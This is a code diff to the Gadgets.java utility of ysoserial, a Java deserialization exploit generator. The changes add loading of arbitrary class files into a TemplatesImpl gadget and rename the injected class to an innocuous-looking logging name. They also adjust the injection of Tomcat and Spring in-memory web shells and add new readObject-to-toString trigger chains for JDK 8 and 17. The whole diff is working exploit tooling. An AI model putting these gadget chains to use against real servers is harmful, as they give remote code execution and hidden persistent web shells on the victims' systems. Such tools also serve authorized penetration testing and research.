@@ -3,29 +3,30 @@ package ysoserial.payloads.util;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
-import java.io.Serializable;
+import java.io.ByteArrayInputStream;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Proxy;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 import java.util.HashMap;
 import java.util.Map;
+import java.util.Vector;
 
-import com.nqzero.permit.Permit;
-import javassist.ClassClassPath;
+import com.sun.org.apache.xpath.internal.objects.XString;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtConstructor;
 import javassist.bytecode.ClassFile;
 
-import com.sun.org.apache.xalan.internal.xsltc.DOM;
-import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+import javax.swing.event.EventListenerList;
+import javax.swing.undo.UndoManager;
 
 
 /*
@@ -81,6 +82,9 @@ public class Gadgets {
             return createTemplatesImplInjectMemshell(tmplArgs[1]);
         } else if (tmplArgs.length == 2 && tmplArgs[0].equals("cmd")) {
             command = tmplArgs[1];
+        } else if (tmplArgs.length == 2 && tmplArgs[0].equals("file")) {
+            byte[] fileContent = Files.readAllBytes(Paths.get(tmplArgs[1]));
+            return  createTemplatesImpl(fileContent);
         }
 
         if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
@@ -98,11 +102,12 @@ public class Gadgets {
         if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
             return createTemplatesImpl(
                 classBytes,
+                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                 Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                 Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
         }
 
-        return createTemplatesImpl(classBytes, TemplatesImpl.class, TransformerFactoryImpl.class);
+        return createTemplatesImpl(classBytes, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
 
 
@@ -116,21 +121,28 @@ public class Gadgets {
             command.replace("\\", "\\\\").replace("\"", "\\\"") +
             "\");";
         CtClass clazz = pool.makeClass("a");
-        clazz.setSuperclass(pool.get(abstTranslet.getName()));
+        // clazz.setSuperclass(pool.get(abstTranslet.getName()));
+        // clazz.getClassFile().setMajorVersion(ClassFile.JAVA_6);
         CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, clazz);
         ctConstructor.setBody(cmd);
         clazz.addConstructor(ctConstructor);
-        clazz.getClassFile().setMajorVersion(ClassFile.JAVA_6);
 
         final byte[] classBytes = clazz.toBytecode();
         clazz.defrost();
-        return createTemplatesImpl(classBytes, tplClass, transFactory);
+        return createTemplatesImpl(classBytes, tplClass, abstTranslet, transFactory);
     }
-    public static <T> T createTemplatesImpl ( final byte[] classBytes, Class<T> tplClass, Class<?> transFactory ) throws Exception {
+    public static <T> T createTemplatesImpl ( final byte[] classBytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory ) throws Exception {
+        ByteArrayInputStream inputStream = new ByteArrayInputStream(classBytes);
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = pool.makeClass(inputStream);
+        ctClass.setName("org.apache.logging.gh4t.FileUtils");
+        ctClass.setSuperclass(pool.get(abstTranslet.getName()));
+        ctClass.getClassFile().setMajorVersion(ClassFile.JAVA_6);
+
         final T templates = tplClass.newInstance();
 
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
-
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {ctClass.toBytecode()});
+        ctClass.defrost();
         // required to make TemplatesImpl happy
         Reflections.setFieldValue(templates, "_name", "a");
         Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
@@ -139,7 +151,7 @@ public class Gadgets {
 
     public static <T> T createTemplatesImplInjectMemshell (String memshellName) throws Exception {
         if (memshellName.indexOf(".") == -1) {
-            String memshellPackage = "ysoserial.bullet.tmpl.memshell.";
+            String memshellPackage = "ysoserial.bullet.template.";
             if (memshellName.startsWith("Tomcat")) {
                 memshellName = memshellPackage + "tomcat." + memshellName;
             } else if (memshellName.startsWith("Spring")) {
@@ -149,9 +161,10 @@ public class Gadgets {
 
         ClassPool pool = ClassPool.getDefault();
         CtClass ctClass = pool.get(memshellName);
-        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
-        ctClass.getClassFile().setMajorVersion(ClassFile.JAVA_6);
+        // ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+        // ctClass.getClassFile().setMajorVersion(ClassFile.JAVA_6);
         byte[] classBytes = ctClass.toBytecode();
+        ctClass.defrost();
 
         return (T) createTemplatesImpl(classBytes);
     }
@@ -175,5 +188,48 @@ public class Gadgets {
         Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
         Reflections.setFieldValue(s, "table", tbl);
         return s;
+    }
+
+    /**
+     * trigger obj.toString()
+     * @param obj
+     * @return
+     * @throws Exception
+     */
+    public static Object makeXStringToStringTrigger(Object obj) throws Exception {
+        XString xString = new XString("ysomap");
+        return makeHashmapEqualsTrigger(obj, xString);
+    }
+
+    /**
+     * trigger obj2.equals(obj1)
+     * @param obj1
+     * @param obj2
+     * @return
+     * @throws Exception
+     */
+    public static Object makeHashmapEqualsTrigger(Object obj1, Object obj2) throws Exception {
+        Map<String, Object> map1 = new HashMap();
+        Map<String, Object> map2 = new HashMap();
+        map1.put("yy", obj1);
+        map1.put("zZ", obj2);
+
+        map2.put("yy", obj2);
+        map2.put("zZ", obj1);
+        return makeMap(map1, map2);
+    }
+
+    /**
+     * from readObject ot obj.toString in jdk8/jdk17
+     * @param obj
+     * @return
+     */
+    public static Object makeReadObjectToStringTrigger(Object obj) throws Exception {
+        EventListenerList list = new EventListenerList();
+        UndoManager manager = new UndoManager();
+        Vector vector = (Vector) Reflections.getFieldValue(manager, "edits");
+        vector.add(obj);
+        Reflections.setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});
+        return list;
     }
 }
